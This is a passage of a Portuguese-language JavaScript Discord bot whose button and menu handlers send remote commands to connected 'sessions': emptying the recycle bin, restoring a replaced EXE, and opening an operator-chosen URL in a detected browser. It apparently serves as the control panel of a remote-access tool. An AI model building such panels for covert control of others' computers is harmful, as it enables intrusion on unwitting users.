              new ButtonBuilder().setCustomId(`confirmClearDisk_${sessionId}`).setLabel("✅ Sim, apagar").setStyle(ButtonStyle.Danger),
              new ButtonBuilder().setCustomId("cancelClearDisk").setLabel("❌ Cancelar").setStyle(ButtonStyle.Secondary)
            )
          ],
          flags: MessageFlags.Ephemeral
        });
        return;
      }

      if (action === "confirmClearDisk") {
        await interaction.update({ content: "🗑️ Executando...", components: [] });
        try {
          await sendCommand(sessionId, "clearDisk");
          await interaction.followUp({ content: "✅ Lixeira esvaziada com sucesso!", flags: MessageFlags.Ephemeral });
        } catch (err) {
          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "cancelClearDisk") {
        await interaction.update({ content: "❌ Operação cancelada", components: [] });
        return;
      }

      if (action === "restoreExe") {
        await interaction.reply({ content: "🔄 Enviando comando para restaurar o EXE...", flags: MessageFlags.Ephemeral });
        try {
          await sendCommand(sessionId, "restoreExe");
          // Atualizar o botão de status para vermelho
          await interaction.followUp({ content: "✅ Comando enviado! O processo vai fechar e na próxima execução abrirá normalmente.", flags: MessageFlags.Ephemeral });
        } catch (err) {
          await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
        }
        return;
      }

      if (action === "statusExe") {
        // Botão desabilitado — só mostra status, não faz nada
        await interaction.reply({ content: "ℹ️ Este botão mostra o status do processo.", flags: MessageFlags.Ephemeral });
        return;
      }
    }

    // Modal: URL do navegador
    if (interaction.isModalSubmit() && interaction.customId.startsWith("urlModal::")) {
      const sessionId = interaction.customId.split("::")[1];
      const url = interaction.fields.getTextInputValue("url");
      const session = activeSessions.get(sessionId);

      if (!session || !session.browsers || session.browsers.length === 0) {
        await interaction.reply({ content: "❌ Nenhum navegador detectado", flags: MessageFlags.Ephemeral });
        return;
      }

      const options = session.browsers.map((b) => ({
        label: b.name,
        value: b.exe,
        description: b.path.length > 100 ? b.path.substring(0, 97) + "..." : b.path,
      }));

      options.unshift({ label: "Navegador Padrão", value: "default", description: "Usar navegador padrão do sistema" });

      const row = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
          .setCustomId(`selectBrowser::${sessionId}::${url}`)
          .setPlaceholder("Escolha o navegador")
          .addOptions(options)
      );

      await interaction.reply({
        content: `🌐 Abrindo: \`${url}\`\nEscolha o navegador:`,
        components: [row],
        flags: MessageFlags.Ephemeral,
      });
      return;
    }

    // Select: Escolher navegador
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith("selectBrowser::")) {
      const [, sessionId, url] = interaction.customId.split("::");
      const browserExe = interaction.values[0];

      await interaction.update({ content: `🌐 Abrindo \`${url}\` no navegador...`, components: [] });
      try {
        await sendCommand(sessionId, "openBrowser", { url, browser: browserExe });
        await interaction.followUp({ content: "✅ Navegador aberto!", flags: MessageFlags.Ephemeral });
      } catch (err) {
        await interaction.followUp({ content: `❌ Falha: ${err.message}`, flags: MessageFlags.Ephemeral });
      }
      return;
    }
  } catch (err) {
    console.error("[Interaction] Erro:", err);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: `❌ Erro: ${err.message}`, flags: MessageFlags.Ephemeral });
    }
  }
});

client.login(config.token);
